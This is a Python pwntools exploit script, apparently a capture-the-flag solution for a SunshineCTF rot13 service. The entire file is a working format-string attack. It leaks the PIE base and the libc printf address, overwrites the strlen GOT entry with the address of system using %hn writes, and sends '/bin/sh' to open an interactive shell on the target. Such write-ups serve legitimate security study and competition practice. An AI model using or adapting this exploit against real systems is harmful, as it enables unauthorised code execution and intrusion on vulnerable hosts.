from pwn import *
import socket

def send(p, data):
        p.recvuntil(":")
        p.sendline(data)
        p.recvuntil(":")
        p.recvline()
        recv = p.recvline("")[len("Rot13 encrypted data: "):]
        return recv

def fix_ptr(ptr):
        ret = ""
        for i in xrange(0, len(ptr)):
                try:
                        ret = ret + ptr[i].encode("rot13")
                except:
                        ret = ret + ptr[i]
        return ret

def decode_str(data):
        ret = ""
        for i in xrange(0, len(data)):
                try:
                        ret = data[i].decode("rot13") + ret
                except:
                        ret = data[i] + ret
        return ret

def rot13(s):
        news = ""
        for c in s:
                if c in string.ascii_lowercase:
                        news += chr((ord(c) - ord('a') + 26+13) % 26 + ord('a'))
                elif c in string.ascii_uppercase:
                        news += chr((ord(c) - ord('A') + 26+13) % 26 + ord('A'))
                else:
                        news += c
        return news

def fix(s):
        return rot13(pad(s))

def pad(s):
        return s.ljust(0x100, "A")

def main():
        p = remote("chal1.sunshinectf.org", 20006)

        leak_ptr = "%x $$$ ".encode("rot13")
        # %k %k %k
        # third val leaks PIE, 0x95b further
        pie =  int(send(p, "%x %x %x".encode("rot13")).split(" ")[2],16) - 0x95b

        printf_offset = 0x1fc0

        print "pie: %s" % hex(pie)
        print hex(pie + printf_offset)

        payload = ""
        payload += (fix_ptr(p32(pie+printf_offset)))
        payload += ("%x " * 6 + "$$$%s").encode("rot13")
        p.recvuntil(":")
        p.sendline(payload)

        p.recvline()
        tmp = p.recvline()
        print hexdump(tmp)
        printf = u32((tmp.split("$$$")[1][:4]))
        print "Leaked: %s" % hex(printf)
        p.recvline()
        p.recvuntil(":")


        system_offset = 0x3ada0
        libcsystem = printf + system_offset - 0x49670

        strlen_got = pie + 0x1fd4

        print "%s" % hex(strlen_got)

        num1 = (libcsystem & 0xffff) - 8
        num2 = (libcsystem >> 16) - num1 - 8
        if num2 < 0:
                num2 += 0xffff


        p.sendline(fix(p32(strlen_got) + (p32(strlen_got + 2)) + "%" + str(num1) + "x%7$hn%" + str(num2)     + "x%8$hn"))


        p.recvuntil(":")
        p.sendline("/bin/sh\x00")
        p.interactive()

if __name__ == "__main__":
        main()
